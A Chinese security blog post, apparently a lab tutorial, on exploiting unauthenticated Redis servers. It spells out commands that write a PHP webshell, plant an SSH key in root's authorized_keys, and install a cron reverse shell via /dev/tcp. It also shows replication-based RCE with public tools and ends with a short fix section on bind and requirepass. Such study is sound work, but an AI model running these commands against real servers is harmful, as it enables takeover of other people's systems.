<!DOCTYPE html><html theme="dark" showbanner="true" hasbanner="false"><link href="/fontawesome/css/fontawesome.css" rel="stylesheet"><link href="/fontawesome/css/brands.css" rel="stylesheet"><link href="/fontawesome/css/solid.css" rel="stylesheet"><script src="/js/color.global.min.js"></script><script src="/js/load-settings.js"></script><head><meta charset="utf-8"><title>浅谈Redis未授权 | crumbling&#39;s secret room</title><meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no"><link rel="preload" href="/css/fonts/Roboto-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous"><link rel="preload" href="/css/fonts/Roboto-Bold.ttf" as="font" type="font/ttf" crossorigin="anonymous"><link rel="preload" href="/css/fonts/MaterialSymbolsRounded.woff2" as="font" type="font/woff2" crossorigin="anonymous"><meta name="description" content="漏洞成因默认情况下，Redis会监听6379端口，如果没有设置密码认证，那么任何能够访问该端口的用户都可以执行相应Redis命令。 环境靶机123456wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-4.0.10.tar.gztar -zxf redis-4.0.10.tar.gzcd redis-4.0.10make  make install .&#x2F;sr"><meta property="og:type" content="article"><meta property="og:title" content="浅谈Redis未授权"><meta property="og:url" content="http://example.com/2024/10/19/%E6%B5%85%E8%B0%88redis%E6%9C%AA%E6%8E%88%E6%9D%83/index.html"><meta property="og:site_name" content="crumbling&#39;s secret room"><meta property="og:description" content="漏洞成因默认情况下，Redis会监听6379端口，如果没有设置密码认证，那么任何能够访问该端口的用户都可以执行相应Redis命令。 环境靶机123456wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-4.0.10.tar.gztar -zxf redis-4.0.10.tar.gzcd redis-4.0.10make  make install .&#x2F;sr"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="http://example.com/2024/10/19/%E6%B5%85%E8%B0%88redis%E6%9C%AA%E6%8E%88%E6%9D%83/image-20241019220742138.png"><meta property="og:image" content="http://example.com/2024/10/19/%E6%B5%85%E8%B0%88redis%E6%9C%AA%E6%8E%88%E6%9D%83/image-20241019220814620.png"><meta property="og:image" content="http://example.com/2024/10/19/%E6%B5%85%E8%B0%88redis%E6%9C%AA%E6%8E%88%E6%9D%83/image-20241021122846633.png"><meta property="og:image" content="http://example.com/2024/10/19/%E6%B5%85%E8%B0%88redis%E6%9C%AA%E6%8E%88%E6%9D%83/image-20241021125051516.png"><meta property="og:image" content="http://example.com/2024/10/19/%E6%B5%85%E8%B0%88redis%E6%9C%AA%E6%8E%88%E6%9D%83/image-20241021125204294.png"><meta property="og:image" content="http://example.com/2024/10/19/%E6%B5%85%E8%B0%88redis%E6%9C%AA%E6%8E%88%E6%9D%83/image-20241021140832755.png"><meta property="article:published_time" content="2024-10-19T12:23:39.596Z"><meta property="article:modified_time" content="2024-10-21T06:43:30.080Z"><meta property="article:author" content="crumbling"><meta property="article:tag" content="web"><meta property="article:tag" content="Redis"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="http://example.com/2024/10/19/%E6%B5%85%E8%B0%88redis%E6%9C%AA%E6%8E%88%E6%9D%83/image-20241019220742138.png"><link rel="alternate" href="/atom.xml" title="crumbling's secret room" type="application/atom+xml"><link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-32.png" sizes="32x32"><link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-128.png" sizes="128x128"><link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-180.png" sizes="180x180"><link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-192.png" sizes="192x192"><link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-32.png" sizes="32x32"><link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-128.png" sizes="128x128"><link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-180.png" sizes="180x180"><link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-192.png" sizes="192x192"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="main-grid" class="shadow"><div id="nav"><navbar id="navbar"><nav id="title-nav"><a href="/"><div id="vivia-logo"><div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div></div><div>crumbling's secret room</div></a></nav><nav id="main-nav"><a class="main-nav-link" href="/">Home</a> <a class="main-nav-link" href="/archives">Archives</a> <a class="main-nav-link" href="/about">About</a></nav><nav id="sub-nav"><a id="theme-btn" class="nav-icon"><span class="material-symbols-rounded light-mode-icon">wb_sunny</span> <span class="material-symbols-rounded dark-mode-icon">dark_mode</span> </a><a id="nav-rss-link" class="nav-icon mobile-hide" href="/atom.xml" title="RSS 订阅"><span class="material-symbols-rounded rss">rss_feed</span> </a><a id="nav-search-btn" class="nav-icon" title="搜索" style="display:none"><span class="material-symbols-rounded">search</span></a><div id="nav-menu-btn" class="nav-icon"><span class="material-symbols-rounded">menu</span></div></nav></navbar><div id="nav-dropdown" class="hidden"><div id="dropdown-link-list"><a class="nav-dropdown-link" href="/">Home</a> <a class="nav-dropdown-link" href="/archives">Archives</a> <a class="nav-dropdown-link" href="/about">About</a> <a class="nav-dropdown-link" href="/atom.xml" title="RSS 订阅">RSS</a></div></div><script>let dropdownBtn = document.getElementById("nav-menu-btn");
  let dropdownEle = document.getElementById("nav-dropdown");
  dropdownBtn.onclick = function() {
    dropdownEle.classList.toggle("hidden");
  }</script></div><div id="sidebar-wrapper"><sidebar id="sidebar"><div class="widget-wrap"><div class="info-card"><div class="avatar"><div class="img-dim"></div></div><div class="info"><div class="username">crumbling</div><div class="dot"></div><div class="subtitle">This is the subtitle</div><div class="link-list"><a class="link-btn" target="_blank" rel="noopener" href="https://twitter.com" title="Twitter"><i class="fa-brands fa-twitter"></i></a> <a class="link-btn" target="_blank" rel="noopener" href="https://steamcommunity.com/profiles/76561199334949091/" title="Steam"><i class="fa-brands fa-steam"></i></a> <a class="link-btn" target="_blank" rel="noopener" href="https://github.com/fcrumbling" title="GitHub"><i class="fa-brands fa-github"></i></a></div></div></div></div><div class="sticky"><div class="widget-wrap"><div class="widget"><h3 class="widget-title">标签</h3><ul class="widget-tag-list" itemprop="keywords"><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ATT-CK/" rel="tag">ATT&amp;CK</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Crypto/" rel="tag">Crypto</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Redis/" rel="tag">Redis</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/fastjson/" rel="tag">fastjson</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/gb%E5%9F%BA/" rel="tag">gb基</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/hnp/" rel="tag">hnp</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/%E6%A0%BC%E5%AF%86%E7%A0%81/" rel="tag">格密码</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/%E6%B7%B1%E5%BA%A6%E6%90%9C%E7%B4%A2/" rel="tag">深度搜索</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E/" rel="tag">漏洞</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/%E7%9B%B8%E5%85%B3%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB/" rel="tag">相关明文攻击</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/%E8%83%8C%E5%8C%85%E9%97%AE%E9%A2%98/" rel="tag">背包问题</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/%E8%87%AA%E6%88%91%E4%BB%8B%E7%BB%8D/" rel="tag">自我介绍</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/%E9%9B%85%E5%85%8B%E6%AF%94%E7%AC%A6%E5%8F%B7/" rel="tag">雅克比符号</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/%E9%AB%98%E6%96%AF%E5%90%AF%E5%8F%91%E5%BC%8F/" rel="tag">高斯启发式</a></li></ul></div></div><div class="widget-wrap"><div class="widget"><h3 class="widget-title">归档</h3><a class="archive-link" href="/archives/2024/10">十月 2024<div class="archive-count">2</div></a><a class="archive-link" href="/archives/2024/06">六月 2024<div class="archive-count">1</div></a><a class="archive-link" href="/archives/2024/05">五月 2024<div class="archive-count">2</div></a><a class="archive-link" href="/archives/2023/12">十二月 2023<div class="archive-count">1</div></a><a class="archive-link" href="/archives/2023/11">十一月 2023<div class="archive-count">1</div></a><a class="archive-link" href="/archives/2023/10">十月 2023<div class="archive-count">1</div></a><a class="archive-link" href="/archives/2023/09">九月 2023<div class="archive-count">5</div></a></div></div><div class="widget-wrap"><div class="widget"><h3 class="widget-title">最新文章</h3><ul><a class="recent-link" href="/2024/10/19/%E6%B5%85%E8%B0%88redis%E6%9C%AA%E6%8E%88%E6%9D%83/" title="浅谈Redis未授权"><div class="recent-link-text">浅谈Redis未授权</div></a><a class="recent-link" href="/2024/10/06/%E6%B5%85%E8%B0%88fastjson/" title="浅谈fastjson"><div class="recent-link-text">浅谈fastjson</div></a><a class="recent-link" href="/2024/06/15/%E5%88%B7%E9%A2%98%E8%AE%B0/" title="刷题记（持续更新中）"><div class="recent-link-text">刷题记（持续更新中）</div></a><a class="recent-link" href="/2024/05/27/Portswigger%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/" title="PortSwigger靶场记录"><div class="recent-link-text">PortSwigger靶场记录</div></a><a class="recent-link" href="/2024/05/24/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="Web安全学习笔记"><div class="recent-link-text">Web安全学习笔记</div></a></ul></div></div></div></sidebar></div><div id="content-body"><article id="post-浅谈redis未授权" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting"><div class="article-inner"><div class="article-main"><header class="article-header"><div class="main-title-bar"><div class="main-title-dot"></div><h1 class="p-name article-title" itemprop="headline name">浅谈Redis未授权</h1></div><div class="meta-info-bar"><div class="meta-info"><time class="dt-published" datetime="2024-10-19T12:23:39.596Z" itemprop="datePublished">2024-10-19</time></div><div class="need-seperator meta-info"><div class="meta-cate-flex">未分类</div></div><div class="wordcount need-seperator meta-info">674 词</div></div><ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Redis/" rel="tag">Redis</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul></header><div class="e-content article-entry" itemprop="articleBody"><h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>默认情况下，Redis会监听6379端口，如果没有设置密码认证，那么任何能够访问该端口的用户都可以执行相应Redis命令。</p><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><h2 id="靶机"><a href="#靶机" class="headerlink" title="靶机"></a>靶机</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget http://download.redis.io/releases/redis-4.0.10.tar.gz</span><br><span class="line">tar -zxf redis-4.0.10.tar.gz</span><br><span class="line">cd redis-4.0.10</span><br><span class="line">make  </span><br><span class="line">make install</span><br><span class="line"> ./src/redis-server redis.conf //启动redis</span><br></pre></td></tr></table></figure><p><img src="/2024/10/19/%E6%B5%85%E8%B0%88redis%E6%9C%AA%E6%8E%88%E6%9D%83/image-20241019220742138.png" alt="image-20241019220742138"></p><h2 id="攻击机"><a href="#攻击机" class="headerlink" title="攻击机"></a>攻击机</h2><p>同样下载编译一个<code>redis</code>步骤同上</p><p>连接<code>redis</code></p><p>因为我这边靶机是放在云服务器上，所以需要另外调整一下设置</p><p><code>protected-mode</code>设置为<code>no</code></p><p><code>bind</code>设置为<code>0.0.0.0</code>，默认为只接受本机</p><p>在<code>src</code>目录下通过<code>./redis-cli -h ip</code>连接</p><p><img src="/2024/10/19/%E6%B5%85%E8%B0%88redis%E6%9C%AA%E6%8E%88%E6%9D%83/image-20241019220814620.png" alt="image-20241019220814620"></p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/www/html</span><br><span class="line">config set dbfilename test.php</span><br><span class="line">set webshell &quot;\r\n\r\n&lt;?php phpinfo();?&gt;\r\n\r\n&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p><code>\r\n\r\n</code>代表换行的意思，用<code>redis</code>写入的文件会自带一些版本信息，如果不换行可能会导致无法执行。</p><h2 id="SSH登录"><a href="#SSH登录" class="headerlink" title="SSH登录"></a>SSH登录</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br><span class="line">cd /root/.ssh</span><br><span class="line">(echo -e &quot;\n&quot;;cat id_rsa.pub;echo -e &quot;\n&quot;)&gt;key.txt</span><br><span class="line">cat /root/.ssh/key.txt |./redis-cli -h ip -x set pub</span><br></pre></td></tr></table></figure><p>读取公钥到<code>key.txt</code>里，顺便前后用换行，避免和<code>redis</code>里其他缓存数据混合;然后将key.txt写入redis</p><p><img src="/2024/10/19/%E6%B5%85%E8%B0%88redis%E6%9C%AA%E6%8E%88%E6%9D%83/image-20241021122846633.png" alt="image-20241021122846633"></p><p>设置redis的dump文件路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">config set dir /root/.ssh</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p><code>ssh</code>连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh ip	</span><br></pre></td></tr></table></figure><p><img src="/2024/10/19/%E6%B5%85%E8%B0%88redis%E6%9C%AA%E6%8E%88%E6%9D%83/image-20241021125051516.png" alt="image-20241021125051516"></p><p><img src="/2024/10/19/%E6%B5%85%E8%B0%88redis%E6%9C%AA%E6%8E%88%E6%9D%83/image-20241021125204294.png" alt="image-20241021125204294"></p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>在crontab里写定时任务，然后反弹shell</p><p><code>nc -nvlp 5555</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/spool/cron/crontabs //也可以/var/spool/cron</span><br><span class="line">config set dbfilename root</span><br><span class="line">set xxx &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/ip/5555 0&gt;&amp;1\n\n&quot;  # ip为攻击机ip，每隔1分钟执行一次</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p><img src="/2024/10/19/%E6%B5%85%E8%B0%88redis%E6%9C%AA%E6%8E%88%E6%9D%83/image-20241021140832755.png" alt="image-20241021140832755"></p><h2 id="主从复制getshell"><a href="#主从复制getshell" class="headerlink" title="主从复制getshell"></a>主从复制getshell</h2><blockquote><p>漏洞存在于4.x、5.x版本中，Redis提供了主从模式，主从模式指使用一个redis作为主机，其他的作为备份机，主、从机数据都是一样的，从机只负责读，主机只负责写。<br>在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在Redis中实现一个新的Redis命令，通过写C语言编译并加载恶意的.so文件，达到代码执行的目的</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</span><br><span class="line">cd RedisModules-ExecuteCommand/</span><br><span class="line">make # 生成module.so</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Ridter/redis-rce.git</span><br><span class="line">cd redis-rce/</span><br><span class="line">cp ../RedisModules-ExecuteCommand/src/module.so ./</span><br><span class="line">pip install -r requirements.txt </span><br><span class="line">python redis-rce.py -r ip1 -p 6379 -L ip2 -f module.so # python redis-rce.py -r 目标ip -p 目标端口 -L 本地ip -f 恶意.so</span><br></pre></td></tr></table></figure><p>脚本一把梭，大致扣了步骤，感觉没啥意思</p><h1 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h1><p>从环境配置就能看到，直接去<code>redis.conf</code>里设置好<code>bind</code>，只放行需要放行的<code>ip</code>,以及设置好密码<code>requirepass password</code></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/9548962.html">10.Redis未授权访问漏洞复现与利用 - bmjoker - 博客园</a></p></div></div></div><nav id="article-nav"><a class="article-nav-btn left disabled"><i class="fa-solid fa-angle-left"></i><p class="title-text"></p></a><a class="article-nav-btn right" href="/2024/10/06/%E6%B5%85%E8%B0%88fastjson/" title="浅谈fastjson"><p class="title-text">浅谈fastjson</p><i class="fa-solid fa-angle-right"></i></a></nav></article></div><div id="footer-wrapper"><footer id="footer"><div id="footer-info" class="inner">&copy; 2024 crumbling<br>Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a></div></footer></div><div class="back-to-top-wrapper"><button id="back-to-top-btn" class="back-to-top-btn hide" onclick="topFunction()"><span class="material-symbols-rounded">keyboard_arrow_up</span></button></div><script>function topFunction() {
        window.scroll({ top: 0, behavior: 'smooth' });
    }
    let btn = document.getElementById('back-to-top-btn');
    function scrollFunction() {
        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
            btn.classList.remove('hide')
        } else {
            btn.classList.add('hide')
        }
    }
    window.onscroll = function() {
        scrollFunction();
    }</script></div><script src="/js/light-dark-switch.js"></script></body></html>